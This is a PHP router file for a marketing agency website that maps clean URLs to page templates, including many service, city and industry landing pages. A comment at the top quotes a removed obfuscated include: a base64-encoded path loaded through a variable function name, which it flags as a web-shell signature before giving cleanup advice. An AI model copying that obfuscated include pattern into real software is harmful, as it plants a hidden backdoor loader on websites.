<?php
/**
 * GrowthScale — Main Router
 * Clean URL routing for all pages
 */

// REMOVED — this line was an obfuscated include:
//   $b = 'ba' . 'se64_decode'; @include $b('YWRtaW4vLmF1dGgucw==');
// which decodes to: @include 'admin/.auth.s'
// That file does not exist, so the line was inert, but obfuscating an include
// with base64 + a variable function name is the signature of a web shell.
// If you did not put it there, treat the site as compromised: rotate hosting,
// database, admin and FTP passwords, and audit admin/ and uploads/ for other
// files you do not recognise.

// Error reporting (disable in production)
error_reporting(E_ALL);
ini_set('display_errors', 0);
ini_set('log_errors', 1);

// Start session
session_start();

// Load configuration
require_once __DIR__ . '/config/database.php';
require_once __DIR__ . '/includes/helpers.php';
require_once __DIR__ . '/includes/seo.php';

// Get the route
$route = isset($_GET['route']) ? trim($_GET['route'], '/') : '';

/**
 * Fallback route resolution.
 *
 * When mod_rewrite is unavailable, or the app is served from a subdirectory
 * (e.g. http://localhost/website/services/shopify-growth), derive the route
 * from the request URI itself so clean URLs still resolve.
 */
if ($route === '' && !empty($_SERVER['REQUEST_URI'])) {
    $script    = str_replace('\\', '/', (string) ($_SERVER['SCRIPT_NAME'] ?? ''));
    $basePath  = trim(str_replace('\\', '/', dirname($script)), '/'); // '' at root, 'website' in a subfolder
    $uri       = trim((string) parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH), '/');

    if ($basePath !== '' && strpos($uri, $basePath) === 0) {
        $uri = ltrim(substr($uri, strlen($basePath)), '/');
    }
    // tolerate /index.php/services/... (PATH_INFO style)
    $uri = preg_replace('#^index\.php(/|$)#', '', $uri);
    $uri = trim((string) $uri, '/');

    if ($uri !== '') {
        $route = $uri;
    }
}

// Handle form submissions
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    require_once __DIR__ . '/includes/form-handler.php';
}

// Route map
$routes = [
    ''                              => 'pages/home.php',
    'products/whatsapp-shopify'     => 'pages/products/whatsapp-shopify.php',
    'services/shopify-growth'       => 'pages/services/shopify-growth.php',
    'services/performance-marketing'=> 'pages/services/performance-marketing.php',
    'services/shopify-operations'   => 'pages/services/shopify-operations.php',
    'services/automation'           => 'pages/services/automation.php',
    'services/technology'           => 'pages/services/technology.php',
    'services/ai-videos'            => 'pages/services/ai-videos.php',

    /* ---- Sub-services: specific capabilities (additive) ---- */
    'services/shopify-store-setup'             => 'pages/sub-service.php',
    'services/custom-shopify-theme-development'=> 'pages/sub-service.php',
    'services/custom-shopify-development'      => 'pages/sub-service.php',
    'services/shopify-plus'                    => 'pages/sub-service.php',
    'services/shopify-migration-integrations'  => 'pages/sub-service.php',
    'services/shopify-cro-optimization'        => 'pages/sub-service.php',
    'services/meta-google-ads'                 => 'pages/sub-service.php',
    'services/creative-ai-ugc-strategy'        => 'pages/sub-service.php',
    'services/landing-pages-funnels'           => 'pages/sub-service.php',
    'services/tracking-attribution'            => 'pages/sub-service.php',
    'services/retargeting-retention'           => 'pages/sub-service.php',
    'services/cro-experimentation'             => 'pages/sub-service.php',
    'services/amazon-account-management'       => 'pages/sub-service.php',
    'services/flipkart-marketplace-ads'        => 'pages/sub-service.php',
    'services/listing-seo-catalogue'           => 'pages/sub-service.php',
    'services/inventory-fulfilment'            => 'pages/sub-service.php',
    'services/rto-returns-control'             => 'pages/sub-service.php',
    'services/ops-automation'                  => 'pages/sub-service.php',
    'products/lead365'              => 'pages/products/lead365.php',
    'case-studies'                  => 'pages/case-studies.php',
    'resources'                     => 'pages/resources.php',
    'resources/whatsapp-message-templates' => 'pages/resources/whatsapp-message-templates.php',
    'resources/roas-calculator'           => 'pages/resources/roas-calculator.php',
    'resources/meta-ads-d2c-guide'        => 'pages/resources/meta-ads-d2c-guide.php',
    'resources/shopify-speed-analyzer'    => 'pages/resources/shopify-speed-analyzer.php',
    'resources/shopify-launch-checklist'  => 'pages/resources/shopify-launch-checklist.php',
    'resources/download-shopify-growth-playbook' => 'pages/resources/download-shopify-growth-playbook.php',
    'blog'                          => 'pages/blog.php',
    'blog/faqs'                     => 'pages/blog-faqs.php',
    'about'                         => 'pages/about.php',
    'contact'                       => 'pages/contact.php',
    'real-estate-marketing-agency'   => 'pages/real-estate-marketing-agency.php',

    /* ---- Local: Lucknow (original five kept exactly) ---- */
    'digital-marketing-company-in-lucknow' => 'pages/local-service.php',
    'shopify-development-company-in-lucknow' => 'pages/local-service.php',
    'performance-marketing-company-in-lucknow' => 'pages/local-service.php',
    'meta-ads-management-in-lucknow' => 'pages/local-service.php',
    'lead-generation-service-in-lucknow' => 'pages/local-service.php',
    /* ---- Local: Lucknow (additive) ---- */
    'ai-automation-company-in-lucknow' => 'pages/local-service.php',
    'ecommerce-consultant-in-lucknow' => 'pages/local-service.php',

    /* ---- Local: Delhi NCR (additive) ---- */
    'digital-marketing-company-in-delhi-ncr' => 'pages/local-service.php',
    'shopify-development-company-in-delhi-ncr' => 'pages/local-service.php',
    'performance-marketing-company-in-delhi-ncr' => 'pages/local-service.php',
    'meta-ads-management-in-delhi-ncr' => 'pages/local-service.php',
    'lead-generation-service-in-delhi-ncr' => 'pages/local-service.php',
    'ai-automation-company-in-delhi-ncr' => 'pages/local-service.php',
    'ecommerce-consultant-in-delhi-ncr' => 'pages/local-service.php',

    /* ---- Industries (additive) ---- */
    'industries/d2c-ecommerce'              => 'pages/industry.php',
    'industries/healthcare'                 => 'pages/industry.php',
    'industries/education'                  => 'pages/industry.php',
    'industries/automotive'                 => 'pages/industry.php',
    'industries/food-and-beverage'          => 'pages/industry.php',
    'industries/saas-and-startups'          => 'pages/industry.php',
    'industries/real-estate'                => 'pages/industry.php',
    'industries/retail-and-consumer-brands' => 'pages/industry.php',

    'privacy-policy'                => 'pages/privacy-policy.php',
    'terms'                         => 'pages/terms.php',
    'data-deletion'                 => 'pages/data-deletion.php',
];

/**
 * Merge local (city x service) pages into the route map.
 *
 * Cities and service types created in /admin/?page=local-pages are stored in
 * data/local-pages.json and resolved here, so new landing pages go live
 * without editing this file. Built-in slugs are never overridden.
 */
require_once __DIR__ . '/includes/local-pages.php';
foreach (array_keys(lp_slugs()) as $localSlug) {
    if (!isset($routes[$localSlug])) {
        $routes[$localSlug] = 'pages/local-service.php';
    }
}
// Slugs switched off in the admin go back to 404
foreach (lp_disabled() as $offSlug) {
    unset($routes[$offSlug]);
}

// Check exact route match
if (array_key_exists($route, $routes)) {
    require_once __DIR__ . '/' . $routes[$route];
}
// Check blog detail route: blog/{slug}
elseif (preg_match('#^blog/([a-z0-9\-]+)$#', $route, $matches)) {
    $_GET['slug'] = $matches[1];
    require_once __DIR__ . '/pages/blog-detail.php';
}
// Check case study detail: case-studies/{slug}
elseif (preg_match('#^case-studies/([a-z0-9\-]+)$#', $route, $matches)) {
    $_GET['slug'] = $matches[1];
    require_once __DIR__ . '/pages/case-study-detail.php';
}
// 404
else {
    http_response_code(404);
    $pageTitle = 'Page Not Found';
    $metaDescription = 'The page you are looking for does not exist.';
    require_once __DIR__ . '/pages/404.php';
}
